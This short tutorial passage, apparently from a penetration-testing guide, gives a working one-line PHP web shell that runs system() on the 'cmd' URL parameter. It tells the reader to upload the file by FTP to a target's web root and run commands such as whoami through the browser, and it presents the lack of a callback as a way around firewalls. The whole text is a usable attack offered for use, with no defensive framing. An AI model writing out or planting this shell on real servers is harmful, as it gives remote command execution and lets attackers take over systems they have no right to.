
### "Web Shell" One-Liner

This script doesn't try to "phone home" to your Kali machine. 
Instead, it stays on the server and waits for you to send commands through the URL. This bypasses most firewall issues.

Create a file named `test.php` and upload it:

PHP

```
<?php echo system($_GET['cmd']); ?>
```

### 2. How to use it

Once uploaded to the web root via FTP, go to your browser and append a command to the URL using the `cmd` parameter:

`http://< target-IP >/test.php?cmd=whoami`